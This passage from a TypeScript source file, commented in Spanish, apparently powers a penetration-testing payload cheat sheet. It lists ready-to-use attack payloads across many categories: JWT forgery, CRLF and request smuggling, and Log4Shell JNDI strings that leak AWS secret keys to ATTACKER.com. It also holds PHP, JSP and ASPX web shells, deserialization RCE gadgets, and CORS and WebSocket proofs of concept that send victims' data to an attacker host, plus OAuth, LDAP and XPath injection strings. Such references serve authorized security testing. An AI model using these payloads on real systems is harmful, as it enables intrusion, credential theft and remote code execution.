    '{"username": "admin", "password": {"$regex": "^abc"}}',
    // Aggregation injection
    '{"username": {"$lookup": {"from": "users", "localField": "user", "foreignField": "_id", "as": "data"}}}',
    // Array operators
    '{"username": {"$all": ["admin"]}, "password": {"$gt": ""}}',
    '{"username": {"$elemMatch": {"$gt": "a"}}, "password": {"$gt": ""}}',
  ],
}

export const jwtAttacks: PayloadCategory = {
  title: "JWT — Ataques de Token",
  description: "None algorithm, alg confusion RS→HS, kid injection, jku/x5u SSRF, y manipulación de claims",
  tag: "JWT",
  tagColor: "bg-violet-500/10 text-violet-400 border-violet-500/20",
  payloads: [
    // Algoritmo none
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
    // Header con alg: none (decodificado)
    '{"alg":"none","typ":"JWT"}',
    '{"alg":"None","typ":"JWT"}',
    '{"alg":"NONE","typ":"JWT"}',
    '{"alg":"nOnE","typ":"JWT"}',
    // Claims comunes a manipular
    '{"sub":"admin","role":"admin","iat":1516239022,"exp":9999999999}',
    '{"sub":"1","admin":true,"iat":1516239022,"exp":9999999999}',
    '{"userId":"1","isAdmin":true,"exp":9999999999}',
    // kid injection (SQLi en kid header)
    '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}',
    '{"alg":"HS256","typ":"JWT","kid":"x\' UNION SELECT \'secretkey\'--"}',
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2Rldi9udWxsIn0",
    // jku SSRF — servidor externo provee JWKS
    '{"alg":"RS256","typ":"JWT","jku":"https://ATTACKER.com/jwks.json"}',
    '{"alg":"RS256","typ":"JWT","x5u":"https://ATTACKER.com/cert.pem"}',
    // Confusión RS256 → HS256 (firmar con clave pública como HMAC)
    "Técnica: decodificar JWT RS256, cambiar alg a HS256, firmar con la clave pública del servidor como secreto HMAC",
    // Secrets débiles comunes (para hashcat / jwt-cracker)
    "secret",
    "password",
    "123456",
    "qwerty",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "secretkey",
    "SuperSecret",
    "jwt-secret-key",
    "HS256Key",
    // Claim confusion
    '{"sub":"admin","aud":"https://target.com","exp":9999999999,"iss":"https://trusted-issuer.com"}',
    // Nested JWT / token embedding
    '{"token":"eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."}',
  ],
}

export const crlfInjection: PayloadCategory = {
  title: "CRLF Injection / Header Injection",
  description: "Inyección de cabeceras HTTP, cookie splitting, log poisoning y respuestas HTTP divididas",
  tag: "CRLF",
  tagColor: "bg-lime-500/10 text-lime-400 border-lime-500/20",
  payloads: [
    "%0d%0aSet-Cookie: crlf=injection",
    "%0d%0aLocation: https://ATTACKER.com",
    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0aSet-Cookie: crlf=injection",
    "%0aLocation: https://ATTACKER.com",
    "\\r\\nSet-Cookie: crlf=injection",
    "\\r\\nLocation: https://ATTACKER.com",
    "%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
    "%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
    "%u000d%u000aSet-Cookie: crlf=injection",
    "%c0%8dSet-Cookie: crlf=injection",
    // Log poisoning via CRLF
    "%0d%0aX-Forwarded-For: ../../../../etc/passwd",
    "%0d%0aUser-Agent: <script>alert(1)</script>",
    // HTTP response splitting
    "value%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Injected</h1>",
    "value%0d%0aX-Custom-Header: injected%0d%0aAnother: header",
    // Cookie injection
    "%0d%0aSet-Cookie: admin=true; Path=/; HttpOnly",
    "%0d%0aSet-Cookie: sessionid=deadbeef; Domain=.target.com",
  ],
}

export const httpSmuggling: PayloadCategory = {
  title: "HTTP Request Smuggling",
  description: "Variantes CL.TE, TE.CL y TE.TE para dessincronizar front-end y back-end. Reemplazar \\r\\n literalmente.",
  tag: "HTTP Smuggling",
  tagColor: "bg-rose-500/10 text-rose-400 border-rose-500/20",
  payloads: [
    // CL.TE — frontend usa Content-Length, backend usa Transfer-Encoding
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`,
    // TE.CL — frontend usa Transfer-Encoding, backend usa Content-Length
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`,
    // TE.TE — dos cabeceras Transfer-Encoding, una ofuscada
    `POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nSMUGGLED`,
    // TE ofuscado (bypassea normalización)
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x",
    "Transfer-Encoding:\\x0bchunked",
    "Transfer-Encoding:\\x0cchunked",
    "Transfer-Encoding:\\x00chunked",
    "Transfer-Encoding: chunked\\r\\n Transfer-Encoding: chunked",
    // Detección de vuln — prefijo de petición capturada
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n`,
    // Capturar request de otro usuario
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 130\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\nX-Ignore: X`,
  ],
}

export const log4shell: PayloadCategory = {
  title: "Log4Shell / JNDI Injection",
  description: "CVE-2021-44228 y variantes. Sustituir ATTACKER.com por tu servidor LDAP/DNS para confirmar OOB",
  tag: "Log4Shell",
  tagColor: "bg-amber-500/10 text-amber-400 border-amber-500/20",
  payloads: [
    // Básico
    "${jndi:ldap://ATTACKER.com/a}",
    "${jndi:ldaps://ATTACKER.com/a}",
    "${jndi:rmi://ATTACKER.com/a}",
    "${jndi:dns://ATTACKER.com/a}",
    "${jndi:iiop://ATTACKER.com/a}",
    "${jndi:corba://ATTACKER.com/a}",
    "${jndi:nds://ATTACKER.com/a}",
    "${jndi:http://ATTACKER.com/a}",
    // Ofuscados — evasión de WAF
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ATTACKER.com/a}",
    "${${::-j}ndi:rmi://ATTACKER.com/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://ATTACKER.com}",
    "${${upper:j}ndi:${upper:l}dap://ATTACKER.com/a}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:r}m${lower:i}://ATTACKER.com/a}",
    "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://ATTACKER.com/a}",
    "${j${::-n}di:ldap://ATTACKER.com/a}",
    "${j${lower:n}di:ldap://ATTACKER.com/a}",
    "${j${upper:n}di:ldap://ATTACKER.com/a}",
    "${jndi:ldap://ATTACKER.com/${env:USER}}",
    "${jndi:ldap://ATTACKER.com/${env:HOSTNAME}}",
    "${jndi:ldap://ATTACKER.com/${env:AWS_SECRET_ACCESS_KEY}}",
    "${jndi:ldap://ATTACKER.com/${java:version}}",
    "${jndi:ldap://ATTACKER.com/${sys:java.version}}",
    // En cabeceras comunes afectadas
    "X-Api-Version: ${jndi:ldap://ATTACKER.com/a}",
    "User-Agent: ${jndi:ldap://ATTACKER.com/a}",
    "X-Forwarded-For: ${jndi:ldap://ATTACKER.com/a}",
    "Referer: ${jndi:ldap://ATTACKER.com/a}",
    "Authorization: Bearer ${jndi:ldap://ATTACKER.com/a}",
    "X-Custom-Header: ${jndi:ldap://ATTACKER.com/a}",
    // Log4Shell 2 (CVE-2021-45046) — Context Lookup
    "${jndi:ldap://ATTACKER.com/a}",
    "${ctx:loginId}",
    "${map:type}",
    "${filename}",
    "${web:rootDir}",
  ],
}

export const graphqlAttacks: PayloadCategory = {
  title: "GraphQL — Introspección y Ataques",
  description: "Queries de introspección, batching DoS, inyección en argumentos, bypass de limit y field suggestion",
  tag: "GraphQL",
  tagColor: "bg-sky-500/10 text-sky-400 border-sky-500/20",
  payloads: [
    // Introspección completa
    `{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }`,
    // Introspección simplificada — enumerar tipos
    "{ __schema { types { name kind } } }",
    // Enumerar queries disponibles
    "{ __schema { queryType { fields { name description } } } }",
    // Enumerar mutations
    "{ __schema { mutationType { fields { name } } } }",
    // Field suggestion bypass (typo intencional para sugerencias)
    "{ users { passwrd } }",
    // Query depth DoS
    "{ a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } } } } } } } } } } } }",
    // Batch query DoS
    '[{"query":"{user(id:1){id}}"},{"query":"{user(id:2){id}}"},{"query":"{user(id:3){id}}"}]',
    // Inyección en argumento string
    '{ user(id: "1 OR 1=1") { id name email } }',
    '{ user(email: "admin@test.com\\\" OR \\\"1\\\"=\\\"1") { id } }',
    // Auth bypass via null
    '{ admin { users { id email password } } }',
    // Aliases para bypass de rate-limit
    "{ a: user(id:1){id} b: user(id:2){id} c: user(id:3){id} d: user(id:4){id} }",
    // CSRF via GET
    "/graphql?query={user(id:1){email}}",
    "/graphiql?query={__schema{types{name}}}",
    "/graphql/console",
    "/v1/graphql",
    "/api/graphql",
    // Fragment circular (DoS)
    "fragment A on User { ...B } fragment B on User { ...A } { user(id:1) { ...A } }",
    // Variables con inyección
    '{"query":"mutation($u:String!,$p:String!){login(username:$u,password:$p){token}}","variables":{"u":"admin","p":"password\\" OR 1=1--"}}',
  ],
}

export const prototypePollution: PayloadCategory = {
  title: "Prototype Pollution",
  description: "Inyección en __proto__, constructor.prototype y Object.prototype para Node.js y apps JavaScript",
  tag: "Prototype Pollution",
  tagColor: "bg-fuchsia-500/10 text-fuchsia-400 border-fuchsia-500/20",
  payloads: [
    // Básico en JSON
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"role": "admin"}}',
    '{"__proto__": {"polluted": "yes"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    // En URL params
    "__proto__[admin]=true",
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "constructor[prototype][admin]=true",
    "constructor.prototype.admin=true",
    // Bypass comunes de sanitizers
    '{"__proto__":{"admin":true}}',
    '{"__pRoTo__":{"admin":true}}',
    '{"__PRO__TO__":{"admin":true}}',
    // RCE via prototype pollution en Node.js (dependencias vulnerables)
    '{"__proto__": {"outputFunctionName": "_x; process.mainModule.require(\'child_process\').execSync(\'id\');//"}}',
    '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=ATTACKER.com:4444"}}',
    '{"__proto__": {"main": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/fd/0"}}',
    // lodash merge / deepmerge path
    '{"__proto__":{"toString":{}}}',
    '{"a":{"__proto__":{"admin":true}}}',
    // Contaminación de env
    '{"__proto__":{"env":{"NODE_OPTIONS":"--require /dev/stdin"}}}',
    // AST injection (Handlebars, Pug, etc.)
    '{"__proto__":{"pendingReq":true}}',
    '{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","original":"process.mainModule.require(\'child_process\').execSync(\'id\').toString()","parts":[]}}]}}',
  ],
}

export const hostHeaderInjection: PayloadCategory = {
  title: "Host Header Injection",
  description: "Password reset poisoning, cache poisoning y bypass de acceso via cabeceras Host, X-Forwarded-Host, X-Host",
  tag: "Host Header",
  tagColor: "bg-orange-500/10 text-orange-400 border-orange-500/20",
  payloads: [
    // Password reset poisoning
    "Host: ATTACKER.com",
    "Host: target.com:@ATTACKER.com",
    "Host: target.com\\nHost: ATTACKER.com",
    // X-Forwarded headers
    "X-Forwarded-Host: ATTACKER.com",
    "X-Forwarded-Host: target.com, ATTACKER.com",
    "X-Forwarded-For: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1, 10.0.0.1",
    "X-Original-Host: ATTACKER.com",
    "X-Host: ATTACKER.com",
    "X-Rewrite-URL: /admin",
    "X-Original-URL: /admin",
    "X-Override-URL: /admin",
    "X-Custom-IP-Authorization: 127.0.0.1",
    "X-Forwarded-Server: ATTACKER.com",
    "X-HTTP-Host-Override: ATTACKER.com",
    // Absoluta URL override
    "GET http://ATTACKER.com/ HTTP/1.1",
    // Interno bypass
    "Host: localhost",
    "Host: 127.0.0.1",
    "Host: 0.0.0.0",
    "Host: 192.168.0.1",
    "Host: internal.target.com",
    // Cache poisoning via port
    "Host: target.com:1337",
    // DoubleSub bypass
    "Host: ATTACKER.com.target.com",
    "Host: target.com.ATTACKER.com",
    // Web cache deception
    "X-Forwarded-Host: evil.com/static/../private",
    // Routing-based intrusion
    "Host: target.com\\r\\nX-Injected: header",
  ],
}

export const fileUploadBypass: PayloadCategory = {
  title: "File Upload — Bypass",
  description: "Evasión de filtros de subida: extensiones dobles, null byte, Content-Type spoofing, magic bytes y SVG/PHP shells",
  tag: "File Upload",
  tagColor: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20",
  payloads: [
    // Extensiones PHP alternativas
    "shell.php5",
    "shell.php4",
    "shell.php3",
    "shell.phtml",
    "shell.pHp",
    "shell.PhP",
    "shell.PHP",
    "shell.php.jpg",
    "shell.php.png",
    "shell.php.gif",
    "shell.php%00.jpg",
    "shell.php\x00.jpg",
    "shell.asp;.jpg",
    "shell.aspx;.jpg",
    // Double extension bypass
    "shell.jpg.php",
    "shell.png.php",
    "shell.gif.php",
    ".htaccess con: AddType application/x-httpd-php .jpg",
    // Content-Type spoofing
    "Content-Type: image/jpeg  (con contenido PHP)",
    "Content-Type: image/png   (con contenido PHP)",
    "Content-Type: image/gif   (con contenido PHP)",
    // Magic bytes — prepend a PHP shell
    "GIF89a; <?php system($_GET['cmd']); ?>",
    "\\xff\\xd8\\xff<?php system($_GET['cmd']); ?>",
    "\\x89PNG\\r\\n<?php system($_GET['cmd']); ?>",
    // SVG con XSS / SSRF
    `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`,
    `<svg><script>alert(document.cookie)</script></svg>`,
    `<svg><image href="http://ATTACKER.com/steal?c="+document.cookie /></svg>`,
    // PHP shells mínimos
    "<?php system($_GET['cmd']); ?>",
    "<?php passthru($_GET['cmd']); ?>",
    "<?php echo shell_exec($_REQUEST['cmd']); ?>",
    "<?php @eval($_POST['x']); ?>",
    `<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],'./'.$_FILES['f']['name']);}?>`,
    // JSP shell
    `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
    // ASPX shell
    `<% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true}}.Start()?System.IO.Path.GetFullPath("."):string.Empty); %>`,
  ],
}

export const deserialization: PayloadCategory = {
  title: "Deserialization — Java / PHP / Python",
  description: "Gadgets y payloads para deserialización insegura en Java (ysoserial), PHP unserialize y Python pickle",
  tag: "Deserialization",
  tagColor: "bg-rose-500/10 text-rose-400 border-rose-500/20",
  payloads: [
    // Java — detección de tipos serializados
    "Objeto Java serializado: magic bytes AC ED 00 05",
    "Base64 de objeto Java: rO0AB (inicio típico de ObjectOutputStream)",
    // Java — ysoserial gadgets (comandos de referencia)
    "java -jar ysoserial.jar CommonsCollections1 'id' | base64",
    "java -jar ysoserial.jar CommonsCollections3 'id' | base64",
    "java -jar ysoserial.jar CommonsCollections6 'id' | base64",
    "java -jar ysoserial.jar Spring1 'id' | base64",
    "java -jar ysoserial.jar Spring2 'id' | base64",
    "java -jar ysoserial.jar Groovy1 'id' | base64",
    "java -jar ysoserial.jar JRMPClient 'ATTACKER.com:1099' | base64",
    "java -jar ysoserial.jar URLDNS 'http://ATTACKER.com' | base64",
    // PHP — Object injection
    `O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`,
    `a:2:{s:8:"username";s:5:"admin";s:8:"password";s:0:"";}`,
    `O:8:"stdClass":1:{s:5:"admin";b:1;}`,
    // PHP — magic method abuse
    `O:9:"SomeClass":1:{s:4:"file";s:11:"/etc/passwd";}`,
    // PHP — phar:// deserialization trigger
    "phar://./upload/shell.jpg/exploit.php",
    // Python pickle RCE
    "import pickle,os; pickle.dumps(type('exploit',(object,),{'__reduce__':lambda self:(os.system,('id',))})())",
    "Payload pickle base64: cos\nsystem\n(S'id'\ntR.",
    // Python — marshal
    "import marshal,base64; exec(marshal.loads(base64.b64decode('...'))) ",
    // .NET viewstate sin MAC
    "/w...== (viewstate con __VIEWSTATEGENERATOR vacío)",
    "EnableViewStateMac=false → manipular viewstate directamente",
    // Ruby Marshal
    "Marshal.load con gadget GEM",
    // Node.js — serialize-javascript / node-serialize
    `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}`,
    // Generic detection headers
    "Content-Type: application/x-java-serialized-object",
    "Content-Type: application/x-www-form-urlencoded (con payload serializado en param)",
  ],
}

export const xssCSPBypass: PayloadCategory = {
  title: "XSS — CSP Bypass",
  description: "Bypass de Content Security Policy via JSONP, angular-ng, base-uri, nonce leak y unsafe-eval gadgets",
  tag: "XSS",
  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  payloads: [
    // JSONP callback injection (si CDN está en whitelist)
    `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`,
    `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app ng-csp><div ng-include="'data:text/html,<script>alert(1)<\\/script>'"></div></div>`,
    // AngularJS sandbox escape (CSP con unsafe-eval bloqueado)
    `{{constructor.constructor('alert(1)')()}}`,
    `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`,
    `<div ng-app>{{$on.constructor('alert(1)')()}}</div>`,
    `<script src=//SITE.com/angular.js></script><div ng-app ng-csp id=p>{{$eval.constructor('alert(1)')()}}</div>`,
    // base-uri injection
    `<base href="https://ATTACKER.com/">`,
    `<base href="//ATTACKER.com/">`,
    // script-src nonce — si nonce se repite o predice
    `<script nonce="LEAKED_NONCE">alert(1)</script>`,
    // unsafe-inline bypass via DOM clobbering
    `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`,
    // Script gadget via trusted whitelisted src
    `<script src="https://www.google.com/jsapi?callback=alert"></script>`,
    `<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>`,
    // SVG animateTransform bypass
    `<svg><animateTransform onbegin=alert(1)></svg>`,
    `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
    // link preload with CSP bypass
    `<link rel=preload as=script href=//ATTACKER.com/xss.js>`,
    // iframe srcdoc bypass
    `<iframe srcdoc="<script>parent.alert(1)</script>">`,
    // Mutation XSS (mXSS)
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
    `<listing><img src=1 onerror=alert(1)></listing>`,
  ],
}

export const corsAttacks: PayloadCategory = {
  title: "CORS — Misconfiguration",
  description: "Explotación de CORS mal configurado: null origin, subdomain takeover, pre-domain bypass y credenciales",
  tag: "CORS",
  tagColor: "bg-sky-500/10 text-sky-400 border-sky-500/20",
  payloads: [
    // Headers de prueba — enviar con cada request
    "Origin: null",
    "Origin: https://ATTACKER.com",
    "Origin: https://target.com.ATTACKER.com",
    "Origin: https://ATTACKERtarget.com",
    "Origin: https://ATTACKER.target.com",
    "Origin: https://target.com%60.ATTACKER.com",
    "Origin: https://target.com_.ATTACKER.com",
    "Origin: https://target.com!.ATTACKER.com",
    "Origin: https://target.com$.ATTACKER.com",
    // Null origin — desde iframe sandboxed
    `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>var req=new XMLHttpRequest();req.open("GET","https://target.com/api/data",true);req.withCredentials=true;req.onload=()=>{fetch("https://ATTACKER.com/?d="+btoa(req.responseText))};req.send()</script>'></iframe>`,
    // CORS con credenciales — PoC completo
    `fetch("https://target.com/api/userinfo",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://ATTACKER.com/?d="+btoa(d)))`,
    // Wildcard con credenciales (config inválida pero a veces presente)
    "Access-Control-Allow-Origin: *  +  Access-Control-Allow-Credentials: true",
    // Pre-flight bypass via simple request
    "Content-Type: text/plain (evita pre-flight, permite CORS bypass con simple request)",
    "Content-Type: application/x-www-form-urlencoded",
    // Regex bypass en validación de Origin
    "Origin: https://target.com.evil.com  (si validación es /target\\.com/)",
    "Origin: https://evil-target.com  (si validación es /target.com$/)",
    "Origin: https://target.com@evil.com",
    // Leak via error response
    "Enviar OPTIONS con Origin: null → si responde 200 con ACAO: null → vulnerable",
  ],
}

export const oauthAttacks: PayloadCategory = {
  title: "OAuth / OIDC — Ataques",
  description: "CSRF en state, redirect_uri bypass, code leakage, implicit flow token steal y misconfigurations OIDC",
  tag: "OAuth",
  tagColor: "bg-purple-500/10 text-purple-400 border-purple-500/20",
  payloads: [
    // CSRF en state — omitir o fijar state
    "/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid&state=FIXED_STATE",
    "/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid  (sin state)",
    // redirect_uri bypass
    "/oauth/authorize?...&redirect_uri=https://ATTACKER.com",
    "/oauth/authorize?...&redirect_uri=https://target.com.ATTACKER.com",
    "/oauth/authorize?...&redirect_uri=https://target.com/callback%2F..%2F..%2FATTACKER.com",
    "/oauth/authorize?...&redirect_uri=https://target.com/callback/../../../ATTACKER.com",
    "/oauth/authorize?...&redirect_uri=https://target.com%40ATTACKER.com",
    "/oauth/authorize?...&redirect_uri=https://ATTACKER.com%23target.com/callback",
    // Implicit flow — token en fragment leakeado a Referer
    "/oauth/authorize?response_type=token&client_id=CLIENT&redirect_uri=CALLBACK",
    // Code leakage via Referer
    "Abrir página externa desde callback → token/code en Referer header",
    // Account linking/chaining
    "Vincular cuenta OAuth con email ya registrado → merge sin verificación",
    // PKCE bypass (code_verifier predecible o no validado)
    "code_challenge=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&code_challenge_method=plain",
    // Open redirect en post-logout
    "/logout?redirect_uri=https://ATTACKER.com",
    "/logout?post_logout_redirect_uri=https://ATTACKER.com",
    // Token reuse tras revocación
    "Reutilizar authorization code ya canjeado → verificar si acepta segunda vez",
    // OIDC — id_token claim manipulation (alg:none)
    '{"alg":"none"}.{"sub":"victim@target.com","email":"admin@target.com"}.',
    // Misconfigured JWKS endpoint
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
    "/oauth/.well-known/openid-configuration",
    // scope escalation
    "/oauth/authorize?...&scope=openid+profile+email+admin",
    "/oauth/authorize?...&scope=openid+read:users+write:users",
  ],
}

export const websocketAttacks: PayloadCategory = {
  title: "WebSocket — Injection & CSWSH",
  description: "Cross-Site WebSocket Hijacking, message injection, CSRF via WS y explotación de mensajes sin autenticación",
  tag: "WebSocket",
  tagColor: "bg-teal-500/10 text-teal-400 border-teal-500/20",
  payloads: [
    // CSWSH PoC — Cross-Site WebSocket Hijacking
    `<script>var ws=new WebSocket("wss://target.com/chat");ws.onopen=()=>ws.send(JSON.stringify({type:"getHistory"}));ws.onmessage=e=>fetch("https://ATTACKER.com/?d="+btoa(e.data));ws.onerror=e=>console.log(e);</script>`,
    // Sin cookie — usando token en URL (si la app lo permite)
    `new WebSocket("wss://target.com/ws?token=VICTIM_TOKEN")`,
    // Mensaje inyectado — SQLi via WS
    `{"action":"search","query":"' OR 1=1--"}`,
    // XSS via WS message reflejado
    `{"action":"chat","message":"<img src=x onerror=alert(1)>"}`,
    // SSTI via WS
    `{"action":"render","template":"{{7*7}}"}`,
    // Prototype pollution via JSON message
    `{"__proto__":{"admin":true},"action":"update"}`,
    // Broken auth — enviar mensaje sin upgrade completo
    `{"type":"auth","token":"undefined"}`,
    `{"type":"auth","token":null}`,
    // Path traversal en WS
    `{"action":"readFile","path":"../../etc/passwd"}`,
    // SSRF via WS proxy
    `{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}`,
    // Enumeration via WS
    `{"action":"getUser","id":1}`,
    `{"action":"getUser","id":2}`,
    // Race condition via WS — enviar múltiples mensajes simultáneos
    "Enviar mismo mensaje 10 veces en paralelo → detectar race condition",
    // WS subprotocol injection
    "Sec-WebSocket-Protocol: javascript",
    "Sec-WebSocket-Protocol: x-custom, admin",
    // Upgrade bypass headers
    "Connection: Upgrade, keep-alive",
    "Upgrade: WebSocket\\r\\nX-Custom: injected",
  ],
}

export const raceConditions: PayloadCategory = {
  title: "Race Conditions",
  description: "Técnicas para explotar TOCTOU, doble gasto, redención múltiple de cupones y registros concurrentes",
  tag: "Race Condition",
  tagColor: "bg-amber-500/10 text-amber-400 border-amber-500/20",
  payloads: [
    // Conceptos clave
    "TOCTOU: Time-Of-Check to Time-Of-Use — ventana entre verificación y ejecución",
    "Limite: 1 cupón/usuario — enviar 10 requests simultáneos con mismo cupón",
    "Doble gasto: transferir mismo saldo en paralelo antes de actualización",
    // Herramientas — comandos de referencia
    "turbo intruder (Burp): race_single_packet_attack.py",
    "ffuf -u https://target.com/coupon -X POST -d 'code=DISC50' -w /dev/null -t 50",
    "parallel curl -s -X POST https://target.com/coupon -d code=DISC50 ::: {1..20}",
    // PoC con fetch paralelo (JavaScript)
    `Promise.all([...Array(20)].map(()=>fetch("/api/coupon/redeem",{method:"POST",body:JSON.stringify({code:"DISC50"}),headers:{"Content-Type":"application/json"},credentials:"include"})))`,
    // PoC con Python asyncio
    "import asyncio,httpx\nasync def r(c):\n  async with httpx.AsyncClient() as cl:\n    return await cl.post('/coupon',data={'code':'DISC50'},cookies={'session':c})\nasyncio.run(asyncio.gather(*[r(SESSION)]*20))",
    // Single-packet attack (HTTP/2) — todos los requests en un solo TCP frame
    "HTTP/2 multiplexing: enviar todos los frames DATA en el mismo paquete TCP",
    "Burp Repeater → Group → Send group in parallel (single-packet)",
    // Patrones de vulnerabilidad
    "Registro doble: POST /register con mismo email en paralelo → dos cuentas",
    "Like/vote: POST /like?postId=1 en paralelo → múltiples likes",
    "Descarga de archivo de pago: GET /download?id=X antes de confirmar pago",
    "Actualizar email + reset password simultáneo → tomar cuenta",
    "Canjear puntos: POST /redeem en paralelo → saldo negativo",
    "Crear recursos ilimitados: POST /api/project en paralelo (si hay límite de 1)",
    // Last-byte sync technique
    "Enviar request con header grande → buffering → enviar último byte de todos simultáneo",
    "Connection: keep-alive + pipelining para sincronizar llegada al servidor",
  ],
}

export const ldapInjection: PayloadCategory = {
  title: "LDAP Injection",
  description: "Bypass de autenticación y enumeración de directorios LDAP/Active Directory mediante filtros maliciosos",
  tag: "LDAP Injection",
  tagColor: "bg-blue-500/10 text-blue-400 border-blue-500/20",
  payloads: [
    // Auth bypass básico
    `*`,
    `*)(&`,
    `*)(uid=*))(|(uid=*`,
    `*)(|(password=*`,
    `admin)(&)`,
    `admin)(|(uid=*`,
    `)(|(uid=*`,
    `*)(uid=admin)(&(uid=*`,
    // En formulario de login (usuario / contraseña)
    `*)(uid=*))(|(uid=*`,
    `*()|%26'`,
    `*()|&'`,
    `*)%00`,
    // Bypass con objectClass
    `*)(objectClass=*`,
    `*)(objectClass=person`,
    `*)(objectClass=user`,
    // Enumeración ciega (blind LDAP)
    `admin*`,
    `a*`,
    `ad*`,
    `adm*`,
    `)(cn=*`,
    `)(sn=*`,
    // DN injection
    `admin, dc=example, dc=com`,
    `cn=admin, dc=example, dc=com)(userPassword=*`,
    // Null byte bypass
    "admin\x00",
    "admin\\00",
    // AND/OR injection
    `admin)(&(objectClass=*`,
    `admin)(|(objectClass=user)(objectClass=*`,
    // Atributos sensibles
    `*)(|(userPassword=*`,
    `*)(|(mail=*`,
    `*)(|(memberOf=*`,
  ],
}

export const xpathInjection: PayloadCategory = {
  title: "XPath Injection",
  description: "Bypass de autenticación y extracción de datos en aplicaciones que usan XPath para consultar XML",
  tag: "XPath Injection",
  tagColor: "bg-teal-500/10 text-teal-400 border-teal-500/20",
  payloads: [
    // Auth bypass básico
    `' or '1'='1`,
    `' or '1'='1'--`,
    `' or 1=1 or ''='`,
    `" or "1"="1`,
    `" or 1=1 or ""="`,
    `') or ('1'='1`,
    `') or (1=1) or ('1'='1`,
    `' or ''='`,
    `' or 'x'='x`,
    `x' or 1=1 or 'x'='y`,
    // Comentarios
    `admin' or 1=1 or 'admin`,
    `admin']%00`,
    `admin'--`,
    // Boolean blind (inferir carácter a carácter)
    `' and string-length(//user[1]/password)=8 and '1'='1`,
    `' and substring(//user[1]/password,1,1)='a' and '1'='1`,
    `' and substring(//user[username='admin']/password,1,1)='a' and '1'='1`,
    // Extracción via count()
    `' and count(//user)=1 and '1'='1`,
    `' and count(//user)>5 and '1'='1`,
